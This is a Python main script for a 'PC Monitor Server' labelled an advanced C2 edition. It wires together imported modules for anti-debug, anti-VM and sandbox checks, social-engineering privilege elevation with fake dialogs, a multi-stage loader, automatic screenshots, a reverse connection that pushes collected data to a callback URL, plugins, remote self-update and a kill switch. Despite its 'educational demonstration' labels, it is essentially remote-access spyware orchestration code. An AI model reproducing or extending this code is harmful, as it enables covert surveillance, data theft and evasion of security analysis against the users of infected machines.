"""
PC Monitor Server - With Advanced C2 Features
Multi-stage loading, plugin system, self-update, kill switch
"""

import sys
import signal
import threading
import argparse
from pathlib import Path

# Import configuration first
from server_modules.config import config, API_KEY, pc_id, DATA_DIR, SCREENSHOTS_DIR, OFFLINE_LOGS_DIR, load_callback_config
from server_modules.utils import get_local_ip, get_all_local_ips

# Import core modules
from server_modules.monitoring import start_monitoring, stop_monitoring, get_monitoring_status
from server_modules.screenshots import auto_screenshot_thread
from server_modules.api_routes import app
from server_modules.reverse_connection import ReverseConnection

# Import evasion modules (safe demonstrations)
from evasion_modules.mutex import check_single_instance, release_mutex
from evasion_modules.anti_debug import check_debugging_environment
from evasion_modules.anti_vm import check_virtual_environment
from evasion_modules.self_protection import IntegrityProtection

# Import new advanced features
try:
    from evasion_modules.multi_stage_loader import MultiStageLoader
    MULTI_STAGE_AVAILABLE = True
except ImportError:
    MULTI_STAGE_AVAILABLE = False
    print("[!] Multi-stage loader not available")

try:
    from server_modules.c2_features import C2CommandHandler, PluginManager, KillSwitch
    C2_FEATURES_AVAILABLE = True
except ImportError:
    C2_FEATURES_AVAILABLE = False
    print("[!] C2 features not available")

try:
    from evasion_modules.social_engineering import PrivilegeManager
    SOCIAL_ENGINEERING_AVAILABLE = True
except ImportError:
    SOCIAL_ENGINEERING_AVAILABLE = False
    print("[!] Social engineering module not available")


# Global C2 handler
c2_handler = None


def print_banner():
    """Display startup banner with connection information"""
    primary_ip = get_local_ip()
    all_ips = get_all_local_ips()
    port = config['port']
    
    print("="*70)
    print("PC MONITOR SERVER - Advanced C2 Edition")
    print("="*70)
    print(f"\nPC ID: {pc_id}")
    print(f"PC Name: {config.get('pc_name', 'Unknown')}")
    print(f"API Key: {API_KEY}")
    print(f"\nPort: {port}")
    print(f"Binding: {config['host']} (all interfaces)")
    
    # Show privilege level
    if SOCIAL_ENGINEERING_AVAILABLE:
        from evasion_modules.social_engineering import PrivilegeChecker
        priv_level = PrivilegeChecker.get_privilege_level()
        is_admin = PrivilegeChecker.is_admin()
        print(f"\nPrivilege Level: {priv_level} {'✓' if is_admin else '⚠'}")
    
    print(f"\n{'-'*70}")
    print("CONNECTION INFORMATION")
    print(f"{'-'*70}")
    
    if primary_ip and primary_ip != "0.0.0.0":
        print(f"\n✓ Primary IPv4 Address: {primary_ip}")
        print(f"\n  Connect from remote client using:")
        print(f"  → http://{primary_ip}:{port}")
    
    if all_ips and len(all_ips) > 1:
        print(f"\n  Additional IP addresses detected:")
        for ip in all_ips:
            if ip != primary_ip:
                print(f"  → http://{ip}:{port}")
    
    print(f"\n  From this PC (localhost):")
    print(f"  → http://127.0.0.1:{port}")
    print(f"  → http://localhost:{port}")
    
    # Show advanced features
    print(f"\n{'-'*70}")
    print("ADVANCED FEATURES")
    print(f"{'-'*70}")
    print(f"Multi-Stage Loading:     {'✓ Available' if MULTI_STAGE_AVAILABLE else '✗ Not Available'}")
    print(f"Plugin System:           {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Remote Updates:          {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Kill Switch:             {'✓ Available' if C2_FEATURES_AVAILABLE else '✗ Not Available'}")
    print(f"Social Engineering:      {'✓ Available' if SOCIAL_ENGINEERING_AVAILABLE else '✗ Not Available'}")
    
    print(f"\n{'-'*70}")
    print(f"\nData directory: {DATA_DIR.absolute()}")
    print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")


def check_environment():
    """
    Perform environment checks (educational demonstration)
    This shows awareness of analysis evasion without blocking execution
    """
    print(f"\n{'-'*70}")
    print("ENVIRONMENT CHECKS (Educational Demo)")
    print(f"{'-'*70}")
    
    # Check for single instance
    print("\n[*] Checking for existing instances...")
    if not check_single_instance():
        print("    ⚠ Another instance may be running")
        print("    Note: Continuing anyway for demo purposes")
    else:
        print("    ✓ Single instance verified")
    
    # Check for debugging
    print("\n[*] Checking debugging environment...")
    debug_info = check_debugging_environment()
    if debug_info['is_being_debugged']:
        print("    ⚠ Debugger detected (demonstration mode - continuing anyway)")
        if debug_info['debugger_present']:
            print("      - IsDebuggerPresent: True")
        if debug_info['remote_debugger']:
            print("      - Remote debugger: True")
        if debug_info['debugger_process']:
            print("      - Debugger process found")
        if debug_info['timing_anomaly']:
            print("      - Timing anomaly detected")
        if debug_info['debugger_parent']:
            print("      - Debugger parent process")
    else:
        print("    ✓ No debugger detected")
    
    # Check for virtualization
    print("\n[*] Checking virtual environment...")
    vm_info = check_virtual_environment()
    if vm_info['is_virtual']:
        print("    ⚠ Virtual machine detected (demonstration mode - continuing anyway)")
        if vm_info['vendor']:
            print(f"      - Vendor: {vm_info['vendor']}")
        if vm_info['vendor_string']:
            print("      - VM vendor string detected")
        if vm_info['vm_process']:
            print("      - VM process detected")
        if vm_info['vm_files']:
            print("      - VM files detected")
        if vm_info['low_resources']:
            print("      - Low resources (possible sandbox)")
    else:
        print("    ✓ Physical machine detected")

    print("\n[*] Checking environment characteristics...")
    try:
        from evasion_modules.environment_awareness import perform_environment_check
        env_check = perform_environment_check()

        if env_check['summary']['likely_sandbox']:
            print(f"    ⚠ Sandbox likely detected (score: {env_check['summary']['suspicion_score']:.1f}%)")
            print("    Note: Continuing anyway for demo purposes")
            for check_name, result in env_check['checks'].items():
                if result.get('suspicious') and result.get('reason'):
                    print(f"      - {result['reason']}")
        else:
            print("    ✓ Environment appears legitimate")
    except ImportError:
        print("    ⚠ Environment awareness module not available")
    except Exception as e:
        print(f"    ⚠ Environment check failed: {e}")
    
    print(f"\n{'-'*70}")
    print("NOTE: These checks are for EDUCATIONAL DEMONSTRATION only.")
    print("In this demo, execution continues regardless of detection.")
    print("Real malware would typically exit or behave differently.")
    print(f"{'-'*70}\n")


def check_privileges():
    """Check and potentially request elevated privileges"""
    if not SOCIAL_ENGINEERING_AVAILABLE:
        print("[!] Social engineering module not available - skipping privilege check")
        return
    
    priv_mgr = PrivilegeManager()
    
    # Show current features
    priv_mgr.adapt_to_privilege_level()
    
    # Ask if should attempt elevation (for demo)
    if not priv_mgr.check_and_elevate("Administrator", force=False):
        print("\n[*] Continuing with user-level privileges")
        print("[*] Some advanced features may be unavailable")


def run_multi_stage_loading():
    """Execute multi-stage loading process"""
    if not MULTI_STAGE_AVAILABLE:
        print("[!] Multi-stage loading not available - skipping")
        return True
    
    print("\n" + "="*70)
    print("MULTI-STAGE LOADING")
    print("="*70)
    print("\nExecuting three-stage loading sequence...")
    print("This demonstrates how malware deploys in stages.")
    print("="*70)
    
    try:
        loader = MultiStageLoader()
        success = loader.execute_all_stages()
        
        if success:
            print("\n✓ All stages completed successfully")
        else:
            print("\n✗ Stage loading failed - environment deemed unsafe")
            print("[!] In production, malware would abort here")
            # For demo, we continue anyway
        
        return success
        
    except Exception as e:
        print(f"\n[!] Multi-stage loading error: {e}")
        return False


def initialize_c2_features():
    """Initialize C2 command handler and features"""
    global c2_handler
    
    if not C2_FEATURES_AVAILABLE:
        print("[!] C2 features not available")
        return None
    
    print("\n" + "="*70)
    print("C2 FEATURES INITIALIZATION")
    print("="*70)
    
    try:
        server_url = f"http://localhost:{config['port']}"
        c2_handler = C2CommandHandler(API_KEY, server_url)
        
        print("\n✓ C2 Command Handler initialized")
        print("✓ Plugin System ready")
        print("✓ Kill Switch armed")
        print("✓ Remote Update ready")
        print("✓ Configuration Manager ready")
        
        # Start kill switch monitor in background
        kill_switch_url = f"{server_url}/api/killswitch/status"
        threading.Thread(
            target=c2_handler.kill_switch.monitor_kill_switch,
            args=(kill_switch_url, 300),  # Check every 5 minutes
            daemon=True
        ).start()
        
        print("\n✓ Kill switch monitoring active")
        print("="*70)
        
        return c2_handler
        
    except Exception as e:
        print(f"\n[!] C2 initialization error: {e}")
        return None


def setup_signal_handlers():
    """Setup graceful shutdown handlers"""
    def signal_handler(sig, frame):
        print("\n\nReceived shutdown signal...")
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


def main(skip_checks: bool = False, skip_multi_stage: bool = False):
    """Main entry point"""
    try:
        # Setup signal handlers
        setup_signal_handlers()
        
        # Perform environment checks (unless skipped)
        if not skip_checks:
            check_environment()
        
        # Check privileges (social engineering demo)
        if not skip_checks:
            check_privileges()
        
        # Run multi-stage loading (unless skipped)
        if not skip_multi_stage:
            run_multi_stage_loading()
        
        # Initialize C2 features
        initialize_c2_features()

        #Start integrity protection
        integrity_protection = IntegrityProtection(enable_continuous_monitoring=True)
        
        # Print startup banner
        print_banner()
        
        # Check for reverse connection config
        callback_config = load_callback_config()
        if callback_config.get('enabled'):
            print(f"\n{'-'*70}")
            print("REVERSE CONNECTION")
            print(f"{'-'*70}")
            print(f"Status: ENABLED")
            print(f"Callback URL: {callback_config.get('callback_url')}")
            print(f"Interval: {callback_config.get('interval')}s")
            print("Server will push data to client automatically")
        
        print("="*70)
        print("\nServer starting... Press Ctrl+C to stop")
        print("="*70 + "\n")
        
        # Start background threads
        screenshot_thread = threading.Thread(target=auto_screenshot_thread, daemon=True)
        screenshot_thread.start()
        
        # Start reverse connection if configured
        reverse_conn = None
        if callback_config.get('enabled'):
            reverse_conn = ReverseConnection(callback_config)
            reverse_conn.start()
        
        # Start Flask server
        app.run(
            host=config['host'],
            port=config['port'],
            debug=False,
            threaded=True
        )
        
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(0)
    except Exception as e:
        print(f"\n\nFatal error: {e}")
        import traceback
        traceback.print_exc()
        stop_monitoring(pc_id)
        release_mutex()
        sys.exit(1)


if __name__ == '__main__':
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='PC Monitor Server with Advanced C2')
    parser.add_argument('--skip-checks', action='store_true',
                       help='Skip environment checks')
    parser.add_argument('--skip-multi-stage', action='store_true',
                       help='Skip multi-stage loading')
    parser.add_argument('--demo-dialogs', action='store_true',
                       help='Show fake dialog demonstrations')
    
    args = parser.parse_args()
    
    # Demo mode - show fake dialogs
    if args.demo_dialogs and SOCIAL_ENGINEERING_AVAILABLE:
        from evasion_modules.social_engineering import SocialEngineeringDemo
        SocialEngineeringDemo.demonstrate_all_dialogs()
        sys.exit(0)
    
    # Normal operation
    main(skip_checks=args.skip_checks, skip_multi_stage=args.skip_multi_stage)